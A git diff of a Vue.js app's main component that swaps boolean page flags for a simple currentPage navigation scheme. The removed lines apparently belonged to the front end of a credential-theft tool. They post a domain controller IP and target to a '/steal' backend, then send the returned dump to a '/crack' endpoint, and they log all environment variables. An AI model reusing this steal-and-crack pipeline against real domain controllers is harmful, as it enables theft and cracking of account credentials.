@@ -1,105 +1,49 @@
 <template>
 
-  <StartPage />
 
-<!-- </template> 
   <NavBar @clicked="onClickChild" />
-  <StatusPage v-if="statusPage"  :phase="action_phase"/>
-  <CreatePage @form_submit="form_submit" v-if="CreatePage" />
-  <HomePage v-if="homePage" />
+  <StatusPage v-if="currentPage=='statuspage'"  />
+  <CreatePage @clicked="onClickChild"  v-if="currentPage=='createpage'" />
+  <HomePage v-if="currentPage=='homepage'" />
+  <StatisticPage v-if="currentPage=='statisticpage'" />
+  <AddPage  v-if="currentPage=='addpage'" />
   <FooterBar class="absolute inset-x-0 bottom-0"/>
-  -->
+ 
 </template>
 
 <script>
 
-//import NavBar from './components/NavBar.vue'
-//import StatusPage from './components/StatusPage.vue'
-//import CreatePage from './components/CreatePage.vue'
-//import HomePage from './components/HomePage.vue'
-//import FooterBar from './components/FooterBar.vue'
-import StartPage from './components/v2/StartPage.vue'
-
+import NavBar from './components/NavBar.vue'
+import StatusPage from './components/StatusPage.vue'
+import CreatePage from './components/CreatePage.vue'
+import HomePage from './components/HomePage.vue'
+import FooterBar from './components/FooterBar.vue'
+import StatisticPage from './components/StatisticPage.vue'
+import AddPage from './components/AddPage.vue'
 
 export default {
   name: 'App',
   components: {
-    StartPage,
+    NavBar,
+    StatusPage,
+    CreatePage,
+    HomePage,
+    FooterBar,
+    StatisticPage,
+    AddPage
 
 
   },
   data() {
     return {
-      statusPage : true,
-      CreatePage: false,
-      homePage: false,
-      dump: '',
-      action_phase : 0
+      currentPage : "createpage",
     }
   },
    methods: {
     onClickChild (value) {
-      console.log(process.env.VUE_APP_SYNCER_REMOTE_URL)
-      console.log(process.env.VUE_APP_CRACKER_REMOTE_URL)
-      console.log(process.env)
-      if (value==="status") {
-        this.statusPage = true;
-        this.CreatePage = false;
-        this.homePage = false;
-      } else if (value==="create") {
-        this.statusPage = false;
-        this.CreatePage = true;
-        this.homePage = false;
-      }else {
-        this.statusPage = false;
-        this.CreatePage = false;
-        this.homePage = true;
-      }
-      
-    },
-    form_submit(data) {
-      console.log(data)
-      
-      // send POST request to localhost:36144 /steal
-      const requestOptions = {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-        dc_ip: data.dc_ip,
-        target: data.target
-      })
-      };
-      this.statusPage = true;
-      this.CreatePage = false;
-      this.homePage = false;
-      this.action_phase = 1;
-
-      
-      fetch(process.env.VUE_APP_SYNCER_REMOTE_URL+"/steal", requestOptions)
-      .then(response => response.json())
-      .then(response => {
-        let entries = response.data.split("\n")
-        const crackOptions = {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-          dc_ip: data.dc_ip,
-          target: data.target,
-          dump: entries
-        })
-        };
-        this.action_phase = 2;
-
-        fetch(process.env.VUE_APP_CRACKER_REMOTE_URL+"/crack",crackOptions)
-        .then(response => response.json())
-        .then(response => {
-          console.log(response.state)
-        });
-        this.dump = response.data;
-        
-      })
-
+      this.currentPage = value
     }
+    
   }
 }
 
